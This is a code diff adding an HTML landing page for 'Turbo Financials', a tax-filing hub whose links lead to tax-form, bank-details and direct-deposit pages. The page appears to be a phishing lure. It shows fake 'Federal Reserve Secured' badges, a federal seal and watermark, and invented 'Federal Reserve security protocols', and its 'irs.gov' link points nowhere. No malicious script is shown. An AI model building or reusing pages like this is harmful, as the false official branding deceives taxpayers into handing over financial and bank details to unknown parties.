@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Turbo Financials - Complete Tax Filing Solution">
+    <title>Turbo Financials - Tax Filing Hub</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Federal Reserve Watermark Background -->
+    <div class="federal-watermark"></div>
+    <div class="federal-seal"></div>
+
+    <div class="form-container tax-wide">
+        <div class="form-header federal-header-accent">
+            <h1>Turbo Financials</h1>
+            <p>Complete your tax filing with our secure online forms</p>
+            <div class="security-badge">Federal Reserve Secured</div>
+        </div>
+
+        <div class="hub-grid">
+            <div class="hub-card">
+                <div class="hub-icon">📋</div>
+                <h2>Tax Information</h2>
+                <p>File your federal income tax return with comprehensive income and deduction reporting.</p>
+                <a href="tax%20RT/tax-form.html" class="hub-button federal-btn">Start Tax Filing</a>
+            </div>
+
+            <div class="hub-card">
+                <div class="hub-icon">💰</div>
+                <h2>Bank Information</h2>
+                <p>Set up your bank account for direct deposit of your tax refund.</p>
+                <a href="index.html" class="hub-button federal-btn">Enter Bank Details</a>
+            </div>
+
+            <div class="hub-card">
+                <div class="hub-icon">✅</div>
+                <h2>Direct Deposit</h2>
+                <p>Authorize direct deposit for faster, secure payment processing.</p>
+                <a href="Direct%20Deposit/DND.html" class="hub-button federal-btn">Authorize Deposit</a>
+            </div>
+        </div>
+
+        <div class="security-note">
+            <strong>🛡️ Federal Reserve Security Standards</strong><br>
+            All information is encrypted with 256-bit AES encryption and protected by Federal Reserve security protocols. The IRS does not email requests for personal information. For more information, visit <a href="#" target="_blank">irs.gov</a>.
+        </div>
+    </div>
+
+    <div class="federal-footer"></div>
+
+    <style>
+        .hub-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+
+        .hub-card {
+            background: linear-gradient(135deg, #f0f9ff 0%, #f8fafc 100%);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: 2rem;
+            text-align: center;
+            transition: all var(--transition-normal);
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .hub-card:hover {
+            box-shadow: var(--shadow-lg);
+            transform: translateY(-4px);
+            border-color: var(--primary-color);
+        }
+
+        .hub-icon {
+            font-size: 3rem;
+        }
+
+        .hub-card h2 {
+            font-size: 1.25rem;
+            color: var(--text-primary);
+            margin: 0;
+        }
+
+        .hub-card p {
+            color: var(--text-secondary);
+            margin: 0;
+            flex-grow: 1;
+        }
+
+        .hub-button {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 0.75rem 2rem;
+            border-radius: var(--radius-md);
+            text-decoration: none;
+            font-weight: 600;
+            transition: all var(--transition-fast);
+            cursor: pointer;
+            border: none;
+        }
+
+        .hub-button:hover {
+            background-color: var(--primary-hover);
+            box-shadow: var(--shadow-md);
+            transform: scale(1.05);
+        }
+
+        @media (max-width: 768px) {
+            .hub-grid {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+
+            .hub-card {
+                padding: 1.5rem;
+            }
+
+            .hub-icon {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
+
+    <script src="script.js"></script>
+</body>
+</html>
